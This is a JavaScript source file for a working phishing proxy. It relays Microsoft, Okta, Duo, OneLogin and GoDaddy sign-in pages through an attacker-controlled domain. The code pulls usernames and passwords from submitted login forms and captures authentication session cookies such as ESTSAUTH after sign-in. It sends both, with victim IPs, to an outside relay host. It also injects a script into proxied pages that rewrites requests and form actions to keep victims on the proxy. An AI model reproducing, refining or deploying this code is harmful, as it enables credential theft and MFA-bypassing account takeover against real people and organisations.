export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// Auth tokens to capture (only these specific cookies)
const AUTH_TOKEN_NAMES = [
  'ESTSAUTH',
  'ESTSAUTHPERSISTENT', 
  'ESTSAUTHLIGHT',
  'SignInStateCookie',
  'esctx',
  'CCState',
  'buid',
  'fpc',
  'MSAAuth',
  'MSAAuthP',
  'O365',
  'OfficeSession'
];

// URLs that indicate successful authentication
const AUTH_URLS = [
  '/kmsi',
  '/common/federation/OAuth2Echo',
  '/common/instrumentation/OAuth2Echo',
  '/common/instrumentation/OAuth2',
  '/oauth2/authorize',
  '/landingv2',
  '/landing',
  '/mail',
  '/calendar',
  '/onedrive',
  '/auth'
];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  
  let modified = false;
  while (params.has('path')) {
    params.delete('path');
    modified = true;
  }
  
  for (const [key, value] of params) {
    if (!value || value === 'undefined' || value === 'null') {
      params.delete(key);
    }
  }
  
  const result = params.toString();
  return result ? '?' + result : '';
}

// ==================== ADVANCED URL PARSER ====================

function parseUrl(pathname, search) {
  console.log(`[PARSE] Input: ${pathname}`);
  
  let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
  
  const segmentPattern = /^_p\/([^\/]+)(\/.*)?$/;
  
  let segments = [];
  let remaining = path;
  
  while (remaining) {
    const match = remaining.match(segmentPattern);
    if (!match) break;
    
    const domain = match[1];
    const rest = match[2] || '';
    
    segments.push({ domain, path: rest });
    remaining = rest;
  }
  
  console.log(`[PARSE] Found ${segments.length} segments:`, segments.map(s => s.domain));
  
  let upstreamDomain = null;
  let upstreamPath = '/';
  let isProxied = false;
  
  for (const segment of segments) {
    if (segment.domain === YOUR_DOMAIN || segment.domain.endsWith(YOUR_DOMAIN)) {
      console.log(`[PARSE] Skipping self-domain: ${segment.domain}`);
      continue;
    }
    
    upstreamDomain = segment.domain;
    upstreamPath = segment.path || '/';
    isProxied = true;
    break;
  }
  
  if (!upstreamDomain) {
    const embeddedMatch = path.match(/.*\/https?:\/?\/?([^\/]+)(.*)/);
    
    if (embeddedMatch) {
      const embeddedHost = embeddedMatch[1];
      const embeddedPath = embeddedMatch[2] || '/';
      
      console.log(`[PARSE] Embedded URL found: host=${embeddedHost}, path=${embeddedPath}`);
      
      if (embeddedHost === YOUR_DOMAIN || embeddedHost.endsWith(YOUR_DOMAIN)) {
        upstreamDomain = 'login.microsoftonline.com';
        upstreamPath = embeddedPath;
        isProxied = true;
        console.log(`[PARSE] Post-login redirect detected, using ${upstreamDomain}`);
      }
    } else {
      console.log(`[PARSE] Pure self request, serving default upstream`);
      return {
        upstream: INITIAL_UPSTREAM,
        type: 'microsoft',
        path: pathname,
        search: cleanQueryString(search),
        isProxied: false
      };
    }
  }
  
  const provider = IDENTITY_PROVIDERS[upstreamDomain];
  
  return {
    upstream: upstreamDomain,
    type: provider ? provider.type : 'unknown',
    path: upstreamPath,
    search: cleanQueryString(search),
    isProxied
  };
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

// ==================== LOCATION REWRITING ====================

function rewriteLocation(location, currentUpstream) {
  try {
    const url = new URL(location);
    
    console.log(`[REWRITE] Location: ${location}, currentUpstream: ${currentUpstream}`);
    
    if (url.hostname === YOUR_DOMAIN || url.hostname.endsWith(`.${YOUR_DOMAIN}`)) {
      const doubleHttpMatch = url.pathname.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
      
      if (doubleHttpMatch) {
        const msHost = doubleHttpMatch[2];
        const msPath = doubleHttpMatch[3] || '/';
        
        if (shouldProxyDomain(msHost)) {
          const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${msHost}${msPath}${url.search}`;
          console.log(`[REWRITE] Double-http rewrite: ${result}`);
          return result;
        }
      }
      
      console.log(`[REWRITE] Already our domain, keeping: ${location}`);
      return location;
    }
    
    if (shouldProxyDomain(url.hostname)) {
      const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanQueryString(url.search)}`;
      console.log(`[REWRITE] Proxy external: ${result}`);
      return result;
    }
    
    console.log(`[REWRITE] Pass through: ${location}`);
    return location;
    
  } catch (e) {
    console.log(`[REWRITE] Relative/malformed: ${location}`);
    
    if (location.startsWith('/') && currentUpstream) {
      const embeddedMatch = location.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
      
      if (embeddedMatch) {
        const embeddedHost = embeddedMatch[2];
        const embeddedPath = embeddedMatch[3] || '/';
        
        if (shouldProxyDomain(embeddedHost)) {
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${embeddedHost}${embeddedPath}`;
        }
        
        if (embeddedHost === YOUR_DOMAIN) {
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${embeddedPath}`;
        }
      }
      
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${location}`;
    }
    
    return location;
  }
}

// ==================== AUTH DETECTION ====================

function isAuthUrl(path) {
  return AUTH_URLS.some(authPath => path.toLowerCase().includes(authPath.toLowerCase()));
}

function hasAuthCookies(cookieStr) {
  if (!cookieStr) return false;
  return AUTH_TOKEN_NAMES.some(name => cookieStr.toLowerCase().includes(name.toLowerCase()));
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    const jsonData = JSON.parse(bodyText);
    user = jsonData.username || jsonData.email || jsonData.user || jsonData.login || jsonData.UserName;
    pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass || jsonData.Password;
    if (user && pass) return { user, pass };
  } catch (e) {}
  
  const params = new URLSearchParams(bodyText);
  const userFields = ['login', 'loginfmt', 'username', 'email', 'user', 'UserName'];
  const passFields = ['passwd', 'password', 'pwd', 'pass', 'Password'];
  
  for (const field of userFields) {
    if (params.has(field)) {
      user = params.get(field);
      break;
    }
  }
  
  for (const field of passFields) {
    if (params.has(field)) {
      pass = params.get(field);
      break;
    }
  }
  
  return { user, pass };
}

function generateInterceptorScript(upstreamDomain, currentPath) {
  const basePath = currentPath.replace(/\/[^\/]*$/, '/');
  return `<script>(function(){
    const P='${PROXY_PREFIX}',D='${YOUR_DOMAIN}',U='${upstreamDomain}',B='${basePath}';
    function r(u){
      if(!u)return u;
      if(u.includes(D+P))return u;
      if(u.startsWith('http')){
        try{
          let h=new URL(u).hostname;
          if(['login.microsoftonline.com','login.live.com','office.com','microsoft.com','msauth.net','okta.com','godaddy.com','secureserver.net'].some(d=>h.includes(d)))
            return u.replace(/^https?:\\/\\/[^\\/]+/,'https://'+D+P+h)
        }catch(e){}
      }
      if(u.startsWith('//')){
        let h=u.split('/')[2];
        if(h&&r('https://'+h)!==u)return'https://'+D+P+h+u.slice(2+h.length)
      }
      if(u.startsWith('/')){
        const emb=u.match(/(.*)\\/https?:\\/?\\/?([^\\/]+)(.*)/);
        if(emb){
          if(emb[2]===D){
            return'https://'+D+P+U+emb[3];
          }
          if(['login.microsoftonline.com','login.live.com','office.com'].some(d=>emb[2].includes(d))){
            return'https://'+D+P+emb[2]+emb[3];
          }
        }
        return u.startsWith(P)?u:'https://'+D+P+U+u
      }
      return'https://'+D+P+U+B+u
    }
    const f=window.fetch;
    window.fetch=function(u,o){
      try{
        return f.call(this,typeof u==='string'?r(u):u instanceof Request?new Request(r(u.url),u):u,o)
      }catch(e){
        return f.call(this,u,o)
      }
    };
    const x=XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open=function(m,u,a,user,pwd){
      try{
        return x.call(this,m,r(u),a,user,pwd)
      }catch(e){
        return x.call(this,m,u,a,user,pwd)
      }
    };
    const s=HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit=function(){
      if(this.action)this.action=r(this.action);
      return s.call(this)
    };
    document.addEventListener('click',function(e){
      let f=e.target.closest('form');
      if(f&&f.action)f.action=r(f.action)
    },true);
  })();</script>`;
}

// ==================== CRITICAL FIX: COOKIE HANDLING ====================

/**
 * Process cookies properly to maintain session context
 * Strategy: Keep cookies as close to original as possible, only rewrite domain for browser compatibility
 */
function processCookies(cookies, upstreamDomain) {
  const modifiedCookies = [];
  const cookieNames = [];
  
  cookies.forEach(cookie => {
    if (!cookie) return;
    
    let modifiedCookie = cookie;
    cookieNames.push(cookie.split('=')[0]);
    
    // Parse cookie attributes
    const parts = cookie.split(';');
    const nameValue = parts[0].trim();
    const attributes = parts.slice(1).map(p => p.trim().toLowerCase());
    
    // Check if this is a session cookie we need to preserve
    const cookieName = nameValue.split('=')[0].trim();
    
    // CRITICAL: Only rewrite the domain attribute, preserve everything else exactly
    // This maintains session context with Microsoft servers
    
    // Remove existing domain attribute if present
    modifiedCookie = modifiedCookie.replace(/domain=[^;]+;?/gi, '');
    modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/g, '');
    
    // Add our domain as the cookie domain (for cross-origin compatibility)
    // Use the root domain to ensure cookies work across all subpaths
    modifiedCookie += `; Domain=${YOUR_DOMAIN}`;
    
    // Ensure Secure and SameSite for HTTPS cross-origin requests
    if (!modifiedCookie.toLowerCase().includes('secure')) {
      modifiedCookie += '; Secure';
    }
    if (!modifiedCookie.toLowerCase().includes('samesite')) {
      modifiedCookie += '; SameSite=None';
    }
    
    // CRITICAL: Don't rewrite the cookie value/path, keep original upstream format
    // The browser will send these cookies back to our proxy domain
    
    modifiedCookies.push(modifiedCookie);
  });
  
  return { modifiedCookies, cookieNames };
}

// ==================== RESPONSE HANDLING ====================

function createResponseHeaders(resp, options = {}) {
  const newHeaders = new Headers();
  
  const headersToCopy = [
    'content-type',
    'content-length',
    'content-encoding',
    'cache-control',
    'expires',
    'etag',
    'last-modified',
    'vary'
  ];
  
  headersToCopy.forEach(name => {
    const value = resp.headers.get(name);
    if (value) {
      newHeaders.set(name, value);
    }
  });
  
  newHeaders.set('access-control-allow-origin', '*');
  newHeaders.set('access-control-allow-credentials', 'true');
  
  if (options.location) {
    newHeaders.set('location', options.location);
  }
  
  if (options.setCookies) {
    options.setCookies.forEach(cookie => {
      newHeaders.append('set-cookie', cookie);
    });
  }
  
  return newHeaders;
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = parseUrl(url.pathname, url.search);
  
  const upstreamDomain = info.upstream;
  const upstreamUrl = 'https://' + upstreamDomain + info.path + info.search;
  
  const isAuthEndpoint = isAuthUrl(info.path);
  console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}${isAuthEndpoint ? ' [AUTH]' : ''}`);

  // Prepare request headers
  const headers = new Headers();
  
  // Copy all client headers including cookies (critical for session)
  const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
  
  clientHeaders.forEach(h => {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  });

  // Set upstream Host header (critical)
  headers.set('Host', upstreamDomain);
  
  // Set proper referer/origin if missing
  if (!request.headers.get('referer')) {
    headers.set('Referer', 'https://' + upstreamDomain + '/');
  }
  if (!request.headers.get('origin')) {
    headers.set('Origin', 'https://' + upstreamDomain);
  }

  // Remove hop-by-hop headers
  ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
   'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'].forEach(h => headers.delete(h));

  let bodyText = null;
  let requestBody = null;

  // Handle credential extraction for POST requests
  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] ${user.substring(0,5)}... on ${info.type}`);
        await sendToVercel('credentials', { 
          type: 'creds', 
          ip, 
          user, 
          pass, 
          platform: info.type, 
          url: url.href 
        });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        formData.append('ip', ip);
        formData.append('type', 'credentials');
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers,
      body: requestBody,
      redirect: 'manual'
    });

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const rewrittenLoc = rewriteLocation(loc, upstreamDomain);
        console.log(`[REDIRECT] ${loc} -> ${rewrittenLoc}`);
        const redirectHeaders = createResponseHeaders(resp, { location: rewrittenLoc });
        return new Response(null, { status: resp.status, headers: redirectHeaders });
      }
    }

    // Process cookies with improved handling
    const cookies = resp.headers.getSetCookie?.() || [];
    let cookieStr = '';
    let shouldCapture = false;

    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      
      // Check if this response contains auth cookies
      const hasAuthCookies = hasAuthCookies(cookieStr);
      const isPostLogin = request.method === 'POST' && (info.path.includes('/login') || info.path.includes('/ProcessAuth'));
      const isAuthRedirect = resp.status === 302 && isAuthUrl(info.path);
      const isKmsiEndpoint = info.path.includes('/kmsi');
      
      // Capture cookies if:
      // 1. It's a POST to login endpoint (credentials just submitted)
      // 2. It's a redirect to an auth URL
      // 3. It's the KMSI (Keep Me Signed In) page
      // 4. Response contains auth tokens and is an auth endpoint
      shouldCapture = isPostLogin || isAuthRedirect || isKmsiEndpoint || (isAuthEndpoint && hasAuthCookies);

      console.log(`[COOKIES] ${cookies.length} cookies: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
      console.log(`[COOKIES] hasAuth=${hasAuthCookies}, capture=${shouldCapture}, path=${info.path}`);

      // Process cookies - preserve session context
      const { modifiedCookies, cookieNames } = processCookies(cookies, upstreamDomain);
      
      // Only exfiltrate if we have actual auth tokens (not just buid/fpc on load)
      if (shouldCapture && hasAuthCookies) {
        console.log(`[EXFILTRATING] Auth cookies detected: ${AUTH_TOKEN_NAMES.filter(n => cookieStr.toLowerCase().includes(n.toLowerCase())).join(', ')}`);
        await exfiltrateCookies(cookieStr, ip, info.type, url.href);
      }

      // Create response headers with processed cookies
      const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });

      // Process body for HTML/JS/CSS
      const ct = resp.headers.get('content-type') || '';
      
      if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
        let text = await resp.text();
        
        // Inject interceptor script for HTML
        if (ct.includes('text/html')) {
          const script = generateInterceptorScript(upstreamDomain, info.path);
          text = text.replace('<head>', '<head>' + script)
                     .replace('<html>', '<html>' + script);
          if (!text.includes(script)) text = script + text;
        }

        // Rewrite domains in content
        Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
          const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
          text = text.split(domain).join(replacement);
        });

        // Handle relative paths in HTML
        if (ct.includes('text/html')) {
          const currentDir = info.path.replace(/\/[^\/]*$/, '/');
          
          text = text.replace(/(src|href)="\/([^"]*)"/gi, (m, attr, path) => {
            if (path.startsWith('_p/') || path.startsWith('data:')) return m;
            return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
          });
          
          text = text.replace(/action="\/([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
          text = text.replace(/action="(?!\/|https?:|#|data:)([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${currentDir}$1"`);
          
          text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (m, path) => {
            if (path.startsWith('_p/')) return m;
            return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path})`;
          });
        }

        return new Response(text, { status: resp.status, headers: responseHeaders });
      }

      // Binary/streaming response
      return new Response(resp.body, { status: resp.status, headers: responseHeaders });
    }

    // No cookies in response
    const responseHeaders = createResponseHeaders(resp);
    const ct = resp.headers.get('content-type') || '';
    
    if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
      let text = await resp.text();
      
      if (ct.includes('text/html')) {
        const script = generateInterceptorScript(upstreamDomain, info.path);
        text = text.replace('<head>', '<head>' + script)
                   .replace('<html>', '<html>' + script);
        if (!text.includes(script)) text = script + text;
      }

      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
        text = text.split(domain).join(replacement);
      });

      return new Response(text, { status: resp.status, headers: responseHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: responseHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    const errorHeaders = new Headers();
    errorHeaders.set('content-type', 'application/json');
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message, stack: err.stack }), 
      { status: 502, headers: errorHeaders }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
